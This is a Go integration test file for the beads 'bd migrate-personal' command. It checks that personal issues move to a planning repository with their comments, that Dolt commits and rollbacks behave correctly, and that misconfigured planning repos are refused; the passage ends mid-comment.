//go:build cgo

package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/steveyegge/beads/internal/configfile"
	"github.com/steveyegge/beads/internal/storage"
	"github.com/steveyegge/beads/internal/storage/embeddeddolt"
	"github.com/steveyegge/beads/internal/storage/issueops"
	"github.com/steveyegge/beads/internal/types"
)

// bdMigratePersonal runs "bd migrate-personal" with the given args.
// Returns stdout+stderr and error (does not fatal on error).
func bdMigratePersonal(t *testing.T, bd, dir string, args ...string) (string, error) {
	t.Helper()
	fullArgs := append([]string{"migrate-personal"}, args...)
	cmd := exec.Command(bd, fullArgs...)
	cmd.Dir = dir
	cmd.Env = bdEnv(dir)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// setupContributorRouting sets routing.contributor to a planning dir so that
// migrate-personal has somewhere to route to.
func setupContributorRouting(t *testing.T, bd, dir string) string {
	t.Helper()
	planningDir := t.TempDir()
	// Init a minimal git repo in the planning dir.
	gitCommand("init", planningDir).Run() //nolint:errcheck
	// Initialize beads in planning dir.
	initCmd := exec.Command(bd, "init", "--prefix", "pl", "--quiet")
	initCmd.Dir = planningDir
	initCmd.Env = bdEnv(planningDir)
	if out, err := initCmd.CombinedOutput(); err != nil {
		t.Fatalf("bd init planning dir: %v\n%s", err, out)
	}

	// Point routing.contributor at the planning dir.
	bdRunWithFlockRetry(t, bd, dir, "config", "set", "routing.contributor", planningDir) //nolint:errcheck
	bdRunWithFlockRetry(t, bd, dir, "config", "set", "routing.mode", "auto")             //nolint:errcheck
	return planningDir
}

// migratePersonalPlanningDatabase is the database setupContributorRouting's
// "bd init --prefix pl" gives the planning repo.
const migratePersonalPlanningDatabase = "pl"

// requireMigratePersonal runs "bd migrate-personal --yes" in dir with bdEnv plus
// extraEnv, fails the test if it errors, and returns its combined output. It
// also rejects the two symptoms of opening the planning store as a SQL server
// under the default database name: a dial to an unreachable server and the
// default-database fallback warning.
func requireMigratePersonal(t *testing.T, bd, dir string, extraEnv ...string) string {
	t.Helper()
	cmd := exec.Command(bd, "migrate-personal", "--yes")
	cmd.Dir = dir
	cmd.Env = append(bdEnv(dir), extraEnv...)
	outBytes, err := cmd.CombinedOutput()
	out := string(outBytes)
	if err != nil {
		t.Fatalf("bd migrate-personal --yes failed: %v\noutput:\n%s", err, out)
	}
	for _, symptom := range []string{"Dolt server unreachable", "no database name configured"} {
		if strings.Contains(out, symptom) {
			t.Errorf("bd migrate-personal --yes output contains %q:\n%s", symptom, out)
		}
	}
	return out
}

// requireMovedToPlanning asserts issueID now lives in the planning repo's own
// database (and that no other database was created there) and is gone from
// the project database.
func requireMovedToPlanning(t *testing.T, projectBeadsDir, projectDB, planningDir, issueID, title string) {
	t.Helper()
	planningBeadsDir := filepath.Join(planningDir, ".beads")
	if got, want := embeddeddolt.Databases(planningBeadsDir), []string{migratePersonalPlanningDatabase}; !slices.Equal(got, want) {
		t.Errorf("planning repo databases = %v, want %v", got, want)
	}
	moved, err := openStore(t, planningBeadsDir, migratePersonalPlanningDatabase).GetIssue(t.Context(), issueID)
	if err != nil {
		t.Fatalf("issue %s not in the planning database %q: %v", issueID, migratePersonalPlanningDatabase, err)
	}
	if moved.Title != title {
		t.Errorf("planning issue %s title = %q, want %q", issueID, moved.Title, title)
	}
	if _, err := openStore(t, projectBeadsDir, projectDB).GetIssue(t.Context(), issueID); !errors.Is(err, storage.ErrNotFound) {
		t.Errorf("issue %s still in the project database %q: err = %v, want storage.ErrNotFound", issueID, projectDB, err)
	}
}

// TestEmbeddedMigratePersonal_noopWhenEmpty verifies that migrate-personal with no
// matching issues exits 0 and reports nothing to migrate.
func TestEmbeddedMigratePersonal_noopWhenEmpty(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, _, _ := bdInit(t, bd, "--prefix", "mpn")

	setupContributorRouting(t, bd, dir)

	// No issues owned by the git identity → noop.
	out, err := bdMigratePersonal(t, bd, dir, "--yes")
	if err != nil {
		// Some backends may report "no issues to migrate" as success.
		// Allow either exit 0 or a meaningful message.
		if !strings.Contains(strings.ToLower(out), "no") &&
			!strings.Contains(strings.ToLower(out), "0 issue") {
			t.Logf("migrate-personal with no matching issues: err=%v output=%s", err, out)
		}
	}
}

// TestEmbeddedMigratePersonal_movesIssues verifies that migrate-personal moves
// issues created by the current identity into the planning repo's own database
// and leaves everyone else's issues in the project.
//
// The personal issue is created WITHOUT --actor, so its created_by is the same
// getActorWithGit identity migrate-personal resolves in the same directory and
// environment.
func TestEmbeddedMigratePersonal_movesIssues(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mpm")
	planningDir := setupContributorRouting(t, bd, dir)

	personal := bdCreate(t, bd, dir, "Personal planning issue")
	team := bdCreate(t, bd, dir, "Team issue", "--actor", "other-person")

	out := requireMigratePersonal(t, bd, dir)
	if !strings.Contains(out, "Moved 1 issue") {
		t.Errorf("migrate-personal output does not report moving 1 issue:\n%s", out)
	}
	// Both halves of the move are Dolt commits. Left in a working set, the
	// planning copy and the project delete would ride along with the next
	// write in each repo, under its message and actor, and bd dolt push would
	// not carry the move.
	planningBeadsDir := filepath.Join(planningDir, ".beads")
	for _, repoBeadsDir := range []string{planningBeadsDir, beadsDir} {
		if _, dirty := embeddedLogCountAndDirtyTables(t, repoBeadsDir); len(dirty) != 0 {
			t.Errorf("%s has uncommitted changes after migrate-personal: %v", repoBeadsDir, dirty)
		}
	}
	requireMovedToPlanning(t, beadsDir, "mpm", planningDir, personal.ID, "Personal planning issue")

	// The team issue stays in the project and is not copied to planning.
	if got, err := openStore(t, beadsDir, "mpm").GetIssue(t.Context(), team.ID); err != nil {
		t.Errorf("team issue %s missing from the project after migrate-personal: %v", team.ID, err)
	} else if got.Title != "Team issue" {
		t.Errorf("project issue %s title = %q, want %q", team.ID, got.Title, "Team issue")
	}
	if _, err := openStore(t, planningBeadsDir, migratePersonalPlanningDatabase).GetIssue(t.Context(), team.ID); !errors.Is(err, storage.ErrNotFound) {
		t.Errorf("team issue %s in the planning database: err = %v, want storage.ErrNotFound", team.ID, err)
	}
}

// TestEmbeddedMigratePersonal_planningDatabaseIgnoresLauncherOverride verifies
// that the planning database comes from the planning repo, not the launcher.
// BEADS_DOLT_SERVER_DATABASE names the launching workspace's database (set by
// the user, or by preserveRedirectSourceDatabase after a redirect) and must not
// choose the planning database: honoring it here would create a project-named
// database inside the planning repo that no bd command run there reads.
func TestEmbeddedMigratePersonal_planningDatabaseIgnoresLauncherOverride(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mpo")
	planningDir := setupContributorRouting(t, bd, dir)

	personal := bdCreate(t, bd, dir, "Personal issue under a launcher override")

	requireMigratePersonal(t, bd, dir, "BEADS_DOLT_SERVER_DATABASE=mpo")
	requireMovedToPlanning(t, beadsDir, "mpo", planningDir, personal.ID, "Personal issue under a launcher override")
}

// TestEmbeddedMigratePersonal_abortOnNoConfirm verifies that without --yes the
// command prompts, and answering n aborts with nothing moved. (An empty answer,
// closed stdin included, takes the default Y and moves.)
func TestEmbeddedMigratePersonal_abortOnNoConfirm(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mpa")
	planningDir := setupContributorRouting(t, bd, dir)

	issue := bdCreate(t, bd, dir, "Personal issue for abort test")

	cmd := exec.Command(bd, "migrate-personal")
	cmd.Dir = dir
	cmd.Env = bdEnv(dir)
	cmd.Stdin = strings.NewReader("n\n")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("bd migrate-personal (answer n) failed: %v\noutput:\n%s", err, out)
	}
	if !strings.Contains(string(out), "Aborted") {
		t.Errorf("bd migrate-personal (answer n) did not abort:\n%s", out)
	}

	if _, err := openStore(t, beadsDir, "mpa").GetIssue(t.Context(), issue.ID); err != nil {
		t.Errorf("issue %s left the project after an aborted migrate-personal: %v", issue.ID, err)
	}
	planningBeadsDir := filepath.Join(planningDir, ".beads")
	if _, err := openStore(t, planningBeadsDir, migratePersonalPlanningDatabase).GetIssue(t.Context(), issue.ID); !errors.Is(err, storage.ErrNotFound) {
		t.Errorf("issue %s in the planning database after an aborted migrate-personal: err = %v, want storage.ErrNotFound", issue.ID, err)
	}
}

// TestEmbeddedMigratePersonal_preservesComments is a regression test for the maphew
// review of PR #4023 (be-e2nb): migrate-personal must copy comments as
// structured rows (ImportIssueComment) so they survive in the planning repo.
// The pre-fix code used AddComment, which records an event-style entry that
// GetIssueComments never returns — silently dropping the migrated issue's
// comments.
func TestEmbeddedMigratePersonal_preservesComments(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mpc")
	planningDir := setupContributorRouting(t, bd, dir)

	issue := bdCreate(t, bd, dir, "Personal issue with a comment")
	const commentText = "migrate-personal-must-preserve-this-comment"
	bdComment(t, bd, dir, issue.ID, commentText)

	requireMigratePersonal(t, bd, dir)
	requireMovedToPlanning(t, beadsDir, "mpc", planningDir, issue.ID, "Personal issue with a comment")

	// The comment must survive in the planning repo as a structured comment that
	// `bd comments <id>` returns.
	got := bdCommentList(t, bd, planningDir, issue.ID)
	if !strings.Contains(got, commentText) {
		t.Errorf("migrated issue %s lost its comment in the planning repo %s.\nbd comments output:\n%s",
			issue.ID, planningDir, got)
	}
}

// TestEmbeddedCopyIssueRelations_preservesCommentWithTimestamp is the in-process proof
// for the maphew review of PR #4023 (be-e2nb). The end-to-end command is covered
// by TestEmbeddedMigratePersonal_preservesComments; this drives the helper
// directly against two embedded stores to pin what the CLI output cannot show:
// a comment must land in the destination as a structured row (returned by
// GetIssueComments) preserving its original timestamp, not be lost as an
// event-style AddComment entry.
func TestEmbeddedCopyIssueRelations_preservesCommentWithTimestamp(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	// Two initialized embedded stores standing in for the project and planning
	// DBs. Same prefix so the copied issue ID is valid in both.
	_, srcBeads, _ := bdInit(t, bd, "--prefix", "mp")
	_, dstBeads, _ := bdInit(t, bd, "--prefix", "mp")
	src := openStore(t, srcBeads, "mp")
	dst := openStore(t, dstBeads, "mp")

	ctx := context.Background()

	issue := &types.Issue{
		ID:        "mp-100",
		Title:     "Issue with a comment",
		Status:    types.StatusOpen,
		IssueType: types.TypeTask,
		CreatedBy: "alice",
	}
	if err := src.CreateIssue(ctx, issue, "alice"); err != nil {
		t.Fatalf("seed src CreateIssue: %v", err)
	}
	origTS := time.Date(2024, 3, 4, 5, 6, 7, 0, time.UTC)
	if _, err := src.ImportIssueComment(ctx, issue.ID, "alice", "preserve me", origTS); err != nil {
		t.Fatalf("seed src comment: %v", err)
	}

	// Phase 1a (copyIssuesToPlanning) creates the issue row in dst first.
	if err := dst.CreateIssue(ctx, issue, "alice"); err != nil {
		t.Fatalf("dst CreateIssue: %v", err)
	}

	// Code under test.
	if err := copyIssueRelations(ctx, src, dst, issue, "alice"); err != nil {
		t.Fatalf("copyIssueRelations: %v", err)
	}

	got, err := dst.GetIssueComments(ctx, issue.ID)
	if err != nil {
		t.Fatalf("dst.GetIssueComments: %v", err)
	}
	if len(got) != 1 {
		t.Fatalf("planning DB has %d structured comments, want 1 (event-style AddComment would yield 0)", len(got))
	}
	if got[0].Text != "preserve me" {
		t.Errorf("comment text = %q, want %q", got[0].Text, "preserve me")
	}
	if !got[0].CreatedAt.Equal(origTS) {
		t.Errorf("comment created_at = %v, want preserved %v (original timestamp dropped)", got[0].CreatedAt, origTS)
	}
}

// TestEmbeddedCopyIssuesToPlanning_commitsEmbeddedPlanningInServerMode verifies
// that phase 1 commits the copy in an embedded planning store when bd runs in
// server mode. The planning repo opens with its own backend
// (openMigrationPlanningStore), so a server-mode project moves issues into an
// embedded planning repo, and the server commits the project's delete as it
// runs: left in the planning working set, the only copy would be one bd dolt
// push does not carry.
func TestEmbeddedCopyIssuesToPlanning_commitsEmbeddedPlanningInServerMode(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	// Not parallel: the command's mode is process state.
	saveStorageMode(t)
	serverMode = true

	bd := buildEmbeddedBD(t)
	_, srcBeads, _ := bdInit(t, bd, "--prefix", "mp")
	_, dstBeads, _ := bdInit(t, bd, "--prefix", "mp")
	src := openStore(t, srcBeads, "mp")
	dst := openStore(t, dstBeads, "mp")
	ctx := t.Context()

	issue := &types.Issue{
		ID:        "mp-200",
		Title:     "Personal issue moved by a server-mode project",
		Status:    types.StatusOpen,
		IssueType: types.TypeTask,
		CreatedBy: "alice",
	}
	if err := src.CreateIssue(ctx, issue, "alice"); err != nil {
		t.Fatalf("seed src CreateIssue: %v", err)
	}
	if err := src.AddLabel(ctx, issue.ID, "personal", "alice"); err != nil {
		t.Fatalf("seed src AddLabel: %v", err)
	}

	// Code under test.
	if _, err := copyIssuesToPlanning(ctx, src, dst, []*types.Issue{issue}, "alice"); err != nil {
		t.Fatalf("copyIssuesToPlanning: %v", err)
	}

	status, err := dst.Status(ctx)
	if err != nil {
		t.Fatalf("planning store Status: %v", err)
	}
	if dirty := slices.Concat(status.Staged, status.Unstaged); len(dirty) != 0 {
		t.Errorf("planning store has uncommitted changes after the copy in server mode: %v", dirty)
	}
	commits, err := dst.Log(ctx, 0)
	if err != nil {
		t.Fatalf("planning store Log: %v", err)
	}
	want := formatDoltAutoCommitMessage("migrate-personal", "alice", []string{issue.ID})
	if !slices.ContainsFunc(commits, func(c storage.CommitInfo) bool { return c.Message == want }) {
		t.Errorf("planning store history has no %q commit", want)
	}
}

// TestCommitPlanningWritesSkipsStoresThatAreNotEmbedded verifies that phase 1
// leaves a planning store that is not embedded to commit its own writes, even
// when bd runs embedded: a server-mode store commits each write itself, and a
// commit of its whole working set would sweep another writer's changes in.
func TestCommitPlanningWritesSkipsStoresThatAreNotEmbedded(t *testing.T) {
	saveStorageMode(t)
	serverMode = false

	fake := &fakeCommitPendingStore{}
	if err := commitPlanningWrites(context.Background(), fake, formatDoltAutoCommitMessage("migrate-personal", "tester", []string{"pl-1"})); err != nil {
		t.Fatalf("commitPlanningWrites: %v", err)
	}
	if fake.commitCalls != 0 {
		t.Errorf("Commit calls = %d, want 0 for a planning store that is not embedded", fake.commitCalls)
	}
}

// indeterminateCommitStore is an embedded planning store whose Commit fails as
// an embedded commit does when it cannot tell whether DOLT_COMMIT landed
// (storage.ErrCommitIndeterminate). It counts the DeleteIssues calls a
// rollback would make. Unwrap lets isEmbeddedStore see the store it wraps.
type indeterminateCommitStore struct {
	storage.DoltStorage
	deleteCalls int
}

func (s *indeterminateCommitStore) Unwrap() storage.DoltStorage { return s.DoltStorage }

func (s *indeterminateCommitStore) Commit(context.Context, string) error {
	return fmt.Errorf("dolt commit: driver: bad connection: %w", storage.ErrCommitIndeterminate)
}

func (s *indeterminateCommitStore) DeleteIssues(ctx context.Context, ids []string, cascade, force, dryRun bool) (*types.DeleteIssuesResult, error) {
	s.deleteCalls++
	return s.DoltStorage.DeleteIssues(ctx, ids, cascade, force, dryRun)
}

// TestEmbeddedCopyIssuesToPlanning_keepsCopyAfterIndeterminateCommit verifies
// that phase 1 does not roll back a copy whose commit may have landed
// (storage.ErrCommitIndeterminate): an uncommitted delete of its rows would
// undo that commit at the planning repo's next one. The error names bd dolt
// commit and the issues now in both repos, and the copy stays in the planning
// store for it to settle.
func TestEmbeddedCopyIssuesToPlanning_keepsCopyAfterIndeterminateCommit(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	// Not parallel: the command's dolt.auto-commit policy is process state.
	saveStorageMode(t)

	bd := buildEmbeddedBD(t)
	_, srcBeads, _ := bdInit(t, bd, "--prefix", "mp")
	_, dstBeads, _ := bdInit(t, bd, "--prefix", "mp")
	src := openStore(t, srcBeads, "mp")
	dst := &indeterminateCommitStore{DoltStorage: openStore(t, dstBeads, "mp")}
	ctx := t.Context()

	issue := &types.Issue{
		ID:        "mp-300",
		Title:     "Personal issue whose planning commit may have landed",
		Status:    types.StatusOpen,
		IssueType: types.TypeTask,
		CreatedBy: "alice",
	}
	if err := src.CreateIssue(ctx, issue, "alice"); err != nil {
		t.Fatalf("seed src CreateIssue: %v", err)
	}

	// Code under test.
	_, err := copyIssuesToPlanning(ctx, src, dst, []*types.Issue{issue}, "alice")
	if !errors.Is(err, storage.ErrCommitIndeterminate) {
		t.Fatalf("copyIssuesToPlanning err = %v, want storage.ErrCommitIndeterminate", err)
	}
	for _, want := range []string{"the copy of " + issue.ID + " is left there", "run `bd dolt commit` in the planning repo"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("copyIssuesToPlanning err = %v, want it to contain %q", err, want)
		}
	}
	if dst.deleteCalls != 0 {
		t.Errorf("DeleteIssues calls = %d after an indeterminate commit, want 0", dst.deleteCalls)
	}
	if _, err := dst.GetIssue(ctx, issue.ID); err != nil {
		t.Errorf("planning copy %s gone after an indeterminate commit: %v", issue.ID, err)
	}
}

// failingCopyStore is a planning store that takes the first issue it is given,
// refuses the next, and fails the rollback's DeleteIssues.
type failingCopyStore struct {
	storage.DoltStorage
	created []string
	deleted [][]string
}

func (s *failingCopyStore) CreateIssue(_ context.Context, issue *types.Issue, _ string) error {
	if len(s.created) > 0 {
		return errors.New("disk full")
	}
	s.created = append(s.created, issue.ID)
	return nil
}

func (s *failingCopyStore) DeleteIssues(_ context.Context, ids []string, _, _, _ bool) (*types.DeleteIssuesResult, error) {
	s.deleted = append(s.deleted, ids)
	return nil, errors.New("database is read only")
}

// TestCopyIssuesToPlanningReportsFailedRollback verifies that a failed copy
// whose rollback fails too reports both, naming the rows the planning DB still
// holds: nothing else tells the user they are there.
func TestCopyIssuesToPlanningReportsFailedRollback(t *testing.T) {
	t.Parallel()
	dst := &failingCopyStore{}
	_, err := copyIssuesToPlanning(context.Background(), nil, dst, []*types.Issue{{ID: "pl-1"}, {ID: "pl-2"}}, "alice")
	if err == nil {
		t.Fatal("copyIssuesToPlanning succeeded, want the second copy's error")
	}
	if len(dst.deleted) != 1 || !slices.Equal(dst.deleted[0], []string{"pl-1"}) {
		t.Errorf("rollback DeleteIssues calls = %v, want one for [pl-1]", dst.deleted)
	}
	for _, want := range []string{"failed to copy issue pl-2 to planning DB: disk full", "rolling the copy back failed too, so the planning DB still holds pl-1", "database is read only"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("copyIssuesToPlanning err = %v, want it to contain %q", err, want)
		}
	}
}

// deleteRecordingStore is a project store that records, for each DeleteIssues
// call, whether its context defers the Dolt version commit.
type deleteRecordingStore struct {
	storage.DoltStorage
	deferred []bool
}

func (s *deleteRecordingStore) DeleteIssues(ctx context.Context, ids []string, _, _, _ bool) (*types.DeleteIssuesResult, error) {
	s.deferred = append(s.deferred, issueops.VersionCommitDeferred(ctx))
	return &types.DeleteIssuesResult{DeletedCount: len(ids)}, nil
}

// TestDeleteMovedIssuesFollowsAutoCommitPolicy verifies that phase 2 deletes
// under the command's dolt.auto-commit policy, as bd delete does. A
// server-mode project's delete honors the deferral
// (DoltStore.doltAddAndCommitInTx), so with batch or off it stays in the
// working set as the copy stays in an embedded planning store, instead of
// being committed while the only copy is not.
func TestDeleteMovedIssuesFollowsAutoCommitPolicy(t *testing.T) {
	saveStorageMode(t)
	for _, tc := range []struct {
		mode     doltAutoCommitMode
		deferred bool
	}{
		{doltAutoCommitOn, false},
		{doltAutoCommitBatch, true},
		{doltAutoCommitOff, true},
	} {
		doltAutoCommit = string(tc.mode)
		project := &deleteRecordingStore{}
		if err := deleteMovedIssues(context.Background(), project, []string{"mp-1"}, "/planning"); err != nil {
			t.Fatalf("dolt.auto-commit %s: deleteMovedIssues: %v", tc.mode, err)
		}
		if !slices.Equal(project.deferred, []bool{tc.deferred}) {
			t.Errorf("dolt.auto-commit %s: DeleteIssues calls deferring the version commit = %v, want [%v]", tc.mode, project.deferred, tc.deferred)
		}
	}
}

// requireMigratePersonalRefused runs "bd migrate-personal --yes" in dir,
// expecting it to fail with output containing want and to report no move. A
// refusal is not a usage error, so cobra's usage block must not follow it. It
// returns the combined output.
func requireMigratePersonalRefused(t *testing.T, bd, dir, want string) string {
	t.Helper()
	out, err := bdMigratePersonal(t, bd, dir, "--yes")
	if err == nil {
		t.Fatalf("bd migrate-personal --yes succeeded, want it refused:\n%s", out)
	}
	if !strings.Contains(out, want) {
		t.Errorf("bd migrate-personal --yes output does not contain %q:\n%s", want, out)
	}
	if strings.Contains(out, "Moved") {
		t.Errorf("bd migrate-personal --yes reported a move while refusing:\n%s", out)
	}
	if strings.Contains(out, "Usage:") {
		t.Errorf("bd migrate-personal --yes printed cobra's usage block after a refusal:\n%s", out)
	}
	return out
}

// requireCleanPlanningRefusal asserts that out carries the refusal of
// planningDir as its own Error line, not prefixed as a failed planning-store
// open: nothing failed to open.
func requireCleanPlanningRefusal(t *testing.T, out, planningDir string) {
	t.Helper()
	if strings.Contains(out, "failed to open planning store") || !strings.Contains(out, "Error: planning repo "+planningDir) {
		t.Errorf("bd migrate-personal --yes output does not refuse with an Error line starting %q:\n%s", "Error: planning repo "+planningDir, out)
	}
}

// requireStillInProject asserts issueID is still in the project database.
func requireStillInProject(t *testing.T, projectBeadsDir, projectDB, issueID string) {
	t.Helper()
	if _, err := openStore(t, projectBeadsDir, projectDB).GetIssue(t.Context(), issueID); err != nil {
		t.Errorf("issue %s left the project database %q after a refused migrate-personal: %v", issueID, projectDB, err)
	}
}

// TestEmbeddedMigratePersonal_refusesPlanningRepoThatIsTheProject verifies that
// a planning repo resolving to the project's own workspace is refused before
// anything moves. Copying an issue onto itself and then deleting it from the
// project deletes the only copy while reporting it moved.
func TestEmbeddedMigratePersonal_refusesPlanningRepoThatIsTheProject(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	for _, tc := range []struct {
		name   string
		prefix string
		value  func(dir string) string
	}{
		{"project path", "mps", func(dir string) string { return dir }},
		{"dot", "mpd", func(string) string { return "." }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			dir, beadsDir, _ := bdInit(t, bd, "--prefix", tc.prefix)
			if out, err := bdRunWithFlockRetry(t, bd, dir, "config", "set", "routing.contributor", tc.value(dir)); err != nil {
				t.Fatalf("bd config set routing.contributor: %v\n%s", err, out)
			}
			personal := bdCreate(t, bd, dir, "Self-routed personal issue")

			requireMigratePersonalRefused(t, bd, dir, "is this project's own workspace")
			requireStillInProject(t, beadsDir, tc.prefix, personal.ID)
		})
	}
}

// sharedRootLayout lays out a shared root as Gas City does: a repository root
// whose .beads holds its own database, hq, and the database rga beside it,
// whose issue_prefix is rga. rig returns a new repository whose .beads
// redirects to rootBeadsDir and whose metadata.json names database there (""
// names none), as each rig of a shared root does.
func sharedRootLayout(t *testing.T, bd string) (root, rootBeadsDir string, rig func(database string) string) {
	t.Helper()
	root, rootBeadsDir, _ = bdInit(t, bd, "--prefix", "hq")
	// The project rig's database, beside the shared root's own.
	s, err := embeddeddolt.Open(t.Context(), rootBeadsDir, "rga", "main")
	if err != nil {
		t.Fatalf("create the project rig's database: %v", err)
	}
	err = s.SetConfig(t.Context(), "issue_prefix", "rga")
	if closeErr := s.Close(); err == nil {
		err = closeErr
	}
	if err != nil {
		t.Fatalf("set the project rig's issue_prefix: %v", err)
	}
	rig = func(database string) string {
		dir := t.TempDir()
		initGitRepoAt(t, dir)
		beadsDir := filepath.Join(dir, ".beads")
		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
			t.Fatalf("create rig .beads: %v", err)
		}
		cfg := configfile.DefaultConfig()
		cfg.Backend = configfile.BackendDolt
		cfg.DoltMode = configfile.DoltModeEmbedded
		cfg.DoltDatabase = database
		if err := cfg.Save(beadsDir); err != nil {
			t.Fatalf("write rig metadata.json: %v", err)
		}
		if err := os.WriteFile(filepath.Join(beadsDir, "redirect"), []byte(rootBeadsDir+"\n"), 0o600); err != nil {
			t.Fatalf("write rig redirect: %v", err)
		}
		return dir
	}
	return root, rootBeadsDir, rig
}

// TestEmbeddedMigratePersonal_refusesSharedRootRigAsARedirect verifies that a
// planning repo that is a rig beside the project under a shared root, where
// both redirect to one .beads and each names a database of its own, is refused
// as the redirect stub it is, naming the database bd uses there, and not as
// the project's own workspace: the two rigs are different databases.
func TestEmbeddedMigratePersonal_refusesSharedRootRigAsARedirect(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	_, townBeadsDir, rig := sharedRootLayout(t, bd)
	project, planning := rig("rga"), rig("rgb")
	if out, err := bdRunWithFlockRetry(t, bd, project, "config", "set", "routing.contributor", planning); err != nil {
		t.Fatalf("bd config set routing.contributor: %v\n%s", err, out)
	}
	personal := bdCreate(t, bd, project, "Personal issue in a shared-root rig")

	out := requireMigratePersonalRefused(t, bd, project, `, where bd uses the database "rgb" that the planning repo names; routing.contributor cannot select that database`)
	if strings.Contains(out, "this project's own workspace") {
		t.Errorf("a rig beside the project under a shared root was refused as the project's own workspace:\n%s", out)
	}
	requireCleanPlanningRefusal(t, out, planning)
	// Refused before the confirmation prompt, which follows this line.
	if strings.Contains(out, "Move to planning repo") {
		t.Errorf("a rig beside the project under a shared root was refused after the confirmation prompt:\n%s", out)
	}
	requireStillInProject(t, townBeadsDir, "rga", personal.ID)
}

// TestEmbeddedMigratePersonal_refusesSharedRootFromARig verifies, from a rig
// under a shared root (the Gas City layout), how a planning repo that uses the
// shared root's own database is refused: the shared root itself, and a stub
// that redirects to it naming that database. Each is refused before the
// confirmation prompt, naming the database bd uses there and the project's,
// and points routing.contributor at a separate planning repository, never at
// the shared root, which would only be refused in turn. That remedy, followed,
// moves the issue.
func TestEmbeddedMigratePersonal_refusesSharedRootFromARig(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	town, townBeadsDir, rig := sharedRootLayout(t, bd)
	project := rig("rga")
	const title = "Personal issue in a shared-root rig"
	personal := bdCreate(t, bd, project, title)

	const want = ` holds the .beads this project uses, where bd uses the database "hq", not this project's "rga"; a database beside this project's is not a separate planning repository; set routing.contributor to a separate planning repository (e.g. ~/.beads-planning)`
	for _, tc := range []struct {
		name, planning, notWant string
	}{
		// Before, this was refused as a redirect with the remedy "set
		// routing.contributor to that repository instead": the shared root.
		{"a stub naming the shared root's database", rig("hq"), "that repository instead"},
		{"the shared root itself", town, "this project's own workspace"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if out, err := bdRunWithFlockRetry(t, bd, project, "config", "set", "routing.contributor", tc.planning); err != nil {
				t.Fatalf("bd config set routing.contributor: %v\n%s", err, out)
			}
			out := requireMigratePersonalRefused(t, bd, project, want)
			if strings.Contains(out, tc.notWant) {
				t.Errorf("bd migrate-personal --yes output contains %q:\n%s", tc.notWant, out)
			}
			requireCleanPlanningRefusal(t, out, tc.planning)
			// Refused before the confirmation prompt, which follows this line.
			if strings.Contains(out, "Move to planning repo") {
				t.Errorf("refused after the confirmation prompt:\n%s", out)
			}
		})
	}

	// The remedy the refusals give works from a rig. Stores are opened in
	// process only after the last bd subprocess.
	planningDir := setupContributorRouting(t, bd, project)
	if out := requireMigratePersonal(t, bd, project); !strings.Contains(out, "Moved 1 issue") {
		t.Errorf("bd migrate-personal --yes output does not report the move:\n%s", out)
	}
	requireMovedToPlanning(t, townBeadsDir, "rga", planningDir, personal.ID, title)
}

// TestRefuseSelfPlanningRepo pins which planning repos refuseSelfPlanningRepo
// refuses, and how. Every one whose .beads, after any redirect, is the
// project's is refused, named for the database bd uses there: the project's
// own is the project's own workspace; one a stub names, other than the
// .beads's own, is a rig beside the project under a shared root, refused as a
// redirect; the .beads's own, from a rig under that shared root, is named as
// that database. A separate directory carrying the project's project_id is a
// clone of the project, and is refused as one. Every refusal ends pointing
// routing.contributor at a separate planning repository: none of these is
